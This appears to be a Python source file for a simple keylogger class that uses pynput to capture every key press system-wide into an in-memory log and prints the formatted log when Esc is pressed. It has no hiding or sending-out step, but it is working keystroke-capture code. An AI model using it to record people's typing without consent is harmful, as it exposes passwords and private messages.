from pynput.keyboard import Key, Listener
import logging
from os import path
from formatter import Formatter

class Logger(object):
    def __init__(self):
        self.formatter = Formatter()
        try:
            from cStringIO import StringIO
        except ImportError:
            from io import StringIO
        self.log_stream = StringIO()
        logging.basicConfig(stream=self.log_stream, level=logging.DEBUG, format='%(message)s')
        #self.log()

    def on_press(self, key):
        if str(key) == 'Key.space':
            logging.info(' ')
        elif str(key) == 'Key.esc':
            logging.info(' (terminated)')
        elif str(key) == 'Key.alt_l':
            logging.info(' <alt_l>')
        elif str(key) == 'Key.alt_r':
            logging.info(' <alt_r>')
        elif str(key) == 'Key.tab':
            logging.info(' <tab>')
        elif str(key) == 'Key.ctrl_l':
            logging.info(' <ctrl_l>')
        elif str(key) == 'Key.ctrl_r':
            logging.info(' <ctrl_r>')
        elif str(key) == 'Key.shift':
            logging.info(' <shift_l>')
        elif str(key) == 'Key.shift_r':
            logging.info(' <shift_r>')
        else:
            logging.info(str(key))
        if key == Key.esc:
            print(self.formatter.format((str(self.log_stream.getvalue()))))
            return False

    def log(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def get_formatted_log(self):
        return self.formatter.format((str(self.log_stream.getvalue())))
